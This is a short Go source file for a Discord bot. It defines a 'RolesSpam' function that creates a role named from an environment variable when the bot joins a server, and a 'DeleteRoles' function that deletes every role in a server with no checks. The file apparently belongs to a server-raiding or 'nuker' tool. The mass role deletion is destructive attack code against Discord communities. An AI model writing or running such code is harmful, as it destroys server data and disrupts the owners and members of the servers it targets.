package cogs

import (
	"fmt"
	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
	"os"
)

func RolesSpam(s *discordgo.Session, event *discordgo.GuildCreate) {
	godotenv.Load()
	ROLE_NAME := os.Getenv("ROLE_NAME")

	data := discordgo.RoleParams{
		Name: ROLE_NAME,
	}

	_, err := s.GuildRoleCreate(event.ID, &data)
	if err != nil {
		fmt.Println("Error creating role: ", err)
		return
	}
}

func DeleteRoles(s *discordgo.Session, event *discordgo.GuildCreate) {
	roles, _ := s.GuildRoles(event.ID)

	for _, role := range roles {
		s.GuildRoleDelete(event.ID, role.ID)
	}
}
